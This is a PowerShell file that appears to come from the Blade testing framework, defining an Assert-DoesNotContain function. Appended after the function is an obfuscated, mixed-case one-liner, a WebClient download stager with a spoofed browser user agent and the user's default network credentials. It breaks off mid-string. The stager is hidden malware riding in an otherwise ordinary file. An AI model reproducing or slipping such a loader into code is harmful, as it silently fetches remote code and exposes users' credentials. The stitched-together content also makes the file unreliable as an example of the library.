













function Assert-DoesNotContain
{
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0)]
        [object]
        
        $Haystack, 

        [Parameter(Position=1)]
        [object]
        
        $Needle, 

        [Parameter(Position=2)]
        [string]
        
        $Message
    )

    Set-StrictMode -Version 'Latest'

    Write-Warning ('Assert-Contains is obsolete and will be removed from a future version of Blade. Please use `Assert-That -Contains` instead.')

    if( $Haystack -contains $Needle )
    {
        Fail "Found '$Needle'. $Message"
    }
}


$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

